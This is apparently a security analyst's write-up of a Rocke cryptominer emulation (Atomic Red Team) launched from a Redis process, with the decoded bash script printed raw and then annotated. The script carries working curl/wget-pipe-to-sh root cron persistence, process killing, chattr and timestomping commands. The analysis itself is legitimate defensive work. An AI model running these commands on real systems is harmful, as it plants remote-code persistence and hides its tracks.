# Scenario #3 Analysis

```text
#Redis server as parent process
Parent Process: redis-server
#https://www.virustotal.com/gui/file/609aa5f366aee242bc237fbafad20214e9c4f1d2d721c87859ba3ae3555873b8
Parent MD5: 9494cfd0f8c829acd9b1a88f9a0fd2ec

#Process spwawns bash shell and curls command to download script hosted on github, base64 decode, and execute the script
Process CLI: 
bash -c “curl  hxxps://gist.githubusercontent[.]com/ForensicITGuy/165c3de5c3f23168517820b12311fd35/raw/c6e44a7e946fba1bb5eaa0d570aeb98727b8cdc8/totes-evil.sh | base64 -d | bash”
Network connection count: 1
```

[https://redcanary.com/blog/threat-detection/rocke-cryptominer/](https://redcanary.com/blog/threat-detection/rocke-cryptominer/)

Sandbox check for the script

*[image unavailable]*

Cyberchef decode

*[image unavailable]*

Raw script before analysis

```bash
#! /bin/bash

function c() {
pkill -f sourplum
pkill -f xmrig
pkill -f cryptonight
pkill -f stratum
pkill -f mixnerdx
pkill -f minexmr
pkill -f minerd
pkill -f minergate
pkill -f kworker34
pkill -f Xbash

#   Tactic: Defense Evasion
#   Technique: T1222 - File Permission Modification
chattr -i /tmp/kworkerds /var/tmp/kworkerds

#   Tactic: Defense Evasion
#   Technique: T1107 - File Deletion
rm -rf /tmp/kworkerds /var/tmp/kworkerds

#   Tactic: Discovery
#   Technique: T1057 - Process Discovery
ps auxf|grep -v grep|grep -v "\_" |grep -v "kthreadd" |grep "\[.*\]"|awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "Xbash" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "stratum" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "minerd" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1

#   Tactic: Discovery
#   Technique: T1049 - System Network Connections Discovery
netstat -anp | grep :3333 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :4444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :5555 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :6666 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :7777 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :3347 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :14433 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1

echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part C" >> /tmp/atomic.log
}

function b() {
    mkdir -p /var/tmp

    #   Tactic: Defense Evasion
    #   Technique: T1222 - File Permission Modification
    chmod 1777 /var/tmp

    #   Tactic: Defense Evasion
    #   Technique: T1036 - Masquerading
    (curl -fsSL --connect-timeout 120 https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -o /var/tmp/kworkerds||wget https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -O /var/tmp/kworkerds) && chmod +x /var/tmp/kworkerds
    nohup /var/tmp/kworkerds >/dev/null 2>&1 &

    echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part B" >> /tmp/atomic.log
}

function a() {

    #   Tactic: Defense Evasion
    #   Technique: T1222 - File Permission Modification
	chattr -i /etc/cron.d/root /var/spool/cron/root /var/spool/cron/crontabs/root

    #   Tactic: Persistence
    #   Technique: T1168 - Local Job Scheduling
	echo -e "*/10 * * * * root (curl -fsSL https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh)|sh\n##" > /etc/cron.d/root
	mkdir -p /var/spool/cron/crontabs
	echo -e "*/31 * * * * (curl -fsSL https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh)|sh\n##" > /var/spool/cron/crontabs/root
	mkdir -p /etc/cron.daily
	(curl -fsSL --connect-timeout 120 https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh -o /etc/cron.daily/oanacroner||wget https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh -O /etc/cron.daily/oanacroner)

    #   Tactic: Defense Evasion
    #   Technique: T1222 - File Permission Modification
    chmod 755 /etc/cron.daily/oanacroner

    #   Tactic: Defense Evasion
    #   Technique: T1099 - Timestomp
	touch -acmr /bin/sh /etc/cron.daily/oanacroner
    touch -acmr /bin/sh /etc/cron.d/root
    touch -acmr /bin/sh /var/spool/cron/crontabs/root

    echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part A" >> /tmp/atomic.log
}

a
b
c
```

Stepped through analysis within the comments, after the script is curled and executed in bash

```bash
#! /bin/bash

#Attempt to kill other cryptominers, if a system is already infected, the actor deploying this crypto mining script wants to take over any other existing crypto mining malware.

#function c

function c() {
pkill -f sourplum
pkill -f xmrig
pkill -f cryptonight
pkill -f stratum
pkill -f mixnerdx
pkill -f minexmr
pkill -f minerd
pkill -f minergate
pkill -f kworker34
pkill -f Xbash

# It's interesting this crypto mining script regerences ttps for each section. First, change attribute and remove immutable attribute so files can be modified., the remove with rm recursive and force

#   Tactic: Defense Evasion
#   Technique: T1222 - File Permission Modification
chattr -i /tmp/kworkerds /var/tmp/kworkerds

#   Tactic: Defense Evasion
#   Technique: T1107 - File Deletion
rm -rf /tmp/kworkerds /var/tmp/kworkerds


# Kill processes that do not contain grep,  and underscore, and match the pattern. followed by terminating more possibly pre-existing crypto miners, force with -9

#   Tactic: Discovery
#   Technique: T1057 - Process Discovery
ps auxf|grep -v grep|grep -v "\_" |grep -v "kthreadd" |grep "\[.*\]"|awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "Xbash" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "stratum" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "minerd" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1


# More local reconnissance to further check if other crypto miners are present

#   Tactic: Discovery
#   Technique: T1049 - System Network Connections Discovery
netstat -anp | grep :3333 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :4444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :5555 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :6666 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :7777 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :3347 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :14433 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1

# Log the date and quoted string to the log
echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part C" >> /tmp/atomic.log
}

#function b

function b() {
#Creates /var/tmp if it doesn’t exist and sets its permissions to 1777 world-readable/writable
    mkdir -p /var/tmp

    #   Tactic: Defense Evasion
    #   Technique: T1222 - File Permission Modification
    chmod 1777 /var/tmp

#Downloads a script atomic-hello using curl or wget and executes it in the background
    #   Tactic: Defense Evasion
    #   Technique: T1036 - Masquerading
    (curl -fsSL --connect-timeout 120 https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -o /var/tmp/kworkerds||wget https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -O /var/tmp/kworkerds) && chmod +x /var/tmp/kworkerds
    nohup /var/tmp/kworkerds >/dev/null 2>&1 &

#Appends timestamp to /tmp/atomic.log
    echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part B" >> /tmp/atomic.log
}

#function a
function a() {

#Removes the immutable attribute from cron job files to allow modifications
    #   Tactic: Defense Evasion
    #   Technique: T1222 - File Permission Modification
	chattr -i /etc/cron.d/root /var/spool/cron/root /var/spool/cron/crontabs/root

#Schedules daily downloads of a malicious script 
    #   Tactic: Persistence
    #   Technique: T1168 - Local Job Scheduling
	echo -e "*/10 * * * * root (curl -fsSL https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh)|sh\n##" > /etc/cron.d/root
	mkdir -p /var/spool/cron/crontabs
	echo -e "*/31 * * * * (curl -fsSL https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh)|sh\n##" > /var/spool/cron/crontabs/root
	mkdir -p /etc/cron.daily
	#Fetches the same malicious script to /etc/cron.daily/oanacroner
	(curl -fsSL --connect-timeout 120 https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh -o /etc/cron.daily/oanacroner||wget https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh -O /etc/cron.daily/oanacroner)

#Set permissions owner read, write, execute, group read, execute, others read, execute
    #   Tactic: Defense Evasion
    #   Technique: T1222 - File Permission Modification
    chmod 755 /etc/cron.daily/oanacroner

#Uses touch -acmr to timestomp cron job files, mimicking the timestamp of /bin/sh
    #   Tactic: Defense Evasion
    #   Technique: T1099 - Timestomp
	touch -acmr /bin/sh /etc/cron.daily/oanacroner
    touch -acmr /bin/sh /etc/cron.d/root
    touch -acmr /bin/sh /var/spool/cron/crontabs/root

#Appends timestamp to /tmp/atomic.log
    echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part A" >> /tmp/atomic.log
}

#Execute function a then b then c
a
b
c
```
